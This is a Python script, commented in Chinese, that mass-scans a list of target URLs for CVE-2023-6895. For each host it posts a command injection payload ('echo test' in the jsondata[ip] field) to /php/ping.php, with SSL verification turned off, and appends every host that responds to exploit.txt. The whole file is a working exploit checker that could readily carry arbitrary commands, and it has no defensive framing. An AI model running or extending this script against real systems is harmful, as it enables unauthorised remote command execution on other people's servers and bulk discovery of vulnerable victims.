import argparse
import requests
import threading
import sys
from tqdm import tqdm

# 禁用SSL证书警告
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def sendRequest(url, proxy=None):
    url = url + "/php/ping.php"
    headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
    data = 'jsondata[type]=3&jsondata[ip]=echo test'

    try:
        if proxy:
            response = requests.post(url, headers=headers, data=data, proxies=proxy, verify=False, timeout=5, allow_redirects=False)
        else:
            response = requests.post(url, headers=headers, data=data, proxies=proxy, verify=False, timeout=5, allow_redirects=False)
        if 'test' in response.text:
            with tqdm.get_lock():
                tqdm.write(f'[+] {url} 存在CVE-2023-6895漏洞!!!')
                with open('exploit.txt', mode='a', encoding='utf8') as f:
                    f.write(url + '\n')
        else:
            pass
    except Exception as e:
        pass

def main():
    parser = argparse.ArgumentParser(description='发送修改过的请求并检查响应')
    parser.add_argument('-u', dest='url', help='目标URL')
    parser.add_argument('-f', dest='file', help='包含文件路径的文件')
    parser.add_argument('-p', dest='proxy', help='代理')
    args = parser.parse_args()

    if not args.url and not args.file:
        parser.error('未指定URL，请使用 -u 参数指定单个目标URL或者 -f 参数指定包含URL的文件')

    if args.proxy:
        proxy = {'http': args.proxy}
    else:
        proxy = None

    if args.url:
        sendRequest(args.url, proxy)
        return

    with open(args.file, 'r') as file:
        urls = file.readlines()

    with tqdm(total=len(urls), desc="Processing URLs") as pbar:
        threads = []
        for url in urls:
            url = url.strip()
            thread = threading.Thread(target=sendRequest, args=(url, proxy))
            threads.append(thread)
            thread.start()
            pbar.update(1)

        for thread in threads:
            thread.join()

if __name__ == "__main__":
    main()
